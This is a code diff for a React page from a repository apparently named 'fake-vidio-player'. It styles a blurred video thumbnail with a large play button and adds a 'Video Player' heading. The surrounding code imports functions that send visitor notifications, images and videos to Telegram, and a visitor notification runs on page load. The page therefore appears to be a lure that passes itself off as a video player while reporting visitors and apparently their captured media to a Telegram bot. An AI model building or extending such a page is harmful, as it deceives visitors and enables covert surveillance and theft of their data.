@@ -3,8 +3,8 @@ import { useState, useEffect, useCallback } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
 function App() {
-  const [isBlurred] = useState(false);
-  const thumbnailUrl = 'https://raw.githubusercontent.com/zsfell/fake-vidio-player/refs/heads/main/assets/img/ok.png';
+  const [isBlurred] = useState(true);
+  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -144,25 +144,26 @@ function App() {
   };
 
   return (
-    <div className="0">
-      <header className="">
+    <div className="relative min-h-screen bg-gray-900">
+      <header className="relative bg-gray-800 py-6">
         <div className="container mx-auto px-4">
+          <h1 className="text-3xl font-bold text-white">Video Player</h1>
         </div>
       </header>
 
-      <main className="">
-        <div className="max-w-[1920px] mx-h-[1080px]">
+      <main className="relative container mx-auto px-4 py-8">
+        <div className="max-w-[1080px] mx-auto">
           <div className="relative">
-            <div className="">
+            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
               {isBlurred && (
-                <div className="" />
+                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
               )}
-              <div className="absolute inset-0 flex items-center justify-center z-50">
+              <div className="absolute inset-0 flex items-center justify-center z-10">
                 <button 
                   onClick={handlePlayClick}
-                  className="bg-red-0 rounded-full p-full hover:bg-red-700 transition-all duration-300 hover:scale-500 group"
+                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                 >
-                  <PlayIcon className="w-full h-full text-white group-hover:text-gray-0" />
+                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                 </button>
               </div>
               <img 
